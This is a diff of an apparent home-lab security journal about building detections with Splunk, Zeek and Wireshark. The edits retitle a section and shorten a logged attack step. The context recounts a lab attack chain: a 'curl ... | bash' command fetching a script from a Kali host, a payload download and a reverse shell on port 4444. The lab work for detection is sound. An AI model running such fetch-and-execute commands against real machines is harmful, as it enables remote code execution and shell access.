@@ -2213,6 +2213,7 @@ This mapping will be used later for building detection rules and documentation
 <img width="1919" height="1076" alt="Captura de pantalla 2025-11-21 135446" src="https://github.com/user-attachments/assets/94f328da-5fdf-4b87-9c0e-15cf514b90b1" />
 <img width="1910" height="622" alt="Captura de pantalla 2025-11-21 135549" src="https://github.com/user-attachments/assets/035ef734-8df4-4336-961a-e3bc651ce63a" />
 
+
 ## Day 35-36  — New Host Laptop Setup & Integration
 Date:November 24-25, 2025
 
@@ -2453,7 +2454,7 @@ Zeek logs will be added tomorrow after TA installation.
 
 ---
 
-# 🎯 Plan for Tomorrow (28 November 2025)
+# 🎯 Next Steps:
 - Install Splunk TA for Zeek & verify field extractions.  
 - Run the full payload chain again but with Zeek + Splunk dashboards.  
 - Save and analyze PCAP in Wireshark (deep dive).  
@@ -2497,7 +2498,7 @@ A complete multi-stage attack was executed:
 
 1. Hosted malicious files (`helper1.sh`, `payload1.sh`) on Kali.
 2. PC2 executed:
-     curl http://192.168.1.125/helper1.sh | bash
+     curl http://192... | bash
    3. Helper script downloaded & ran payload.
 4. Reverse shell opened on port 4444.
 5. Fake secret data was created.
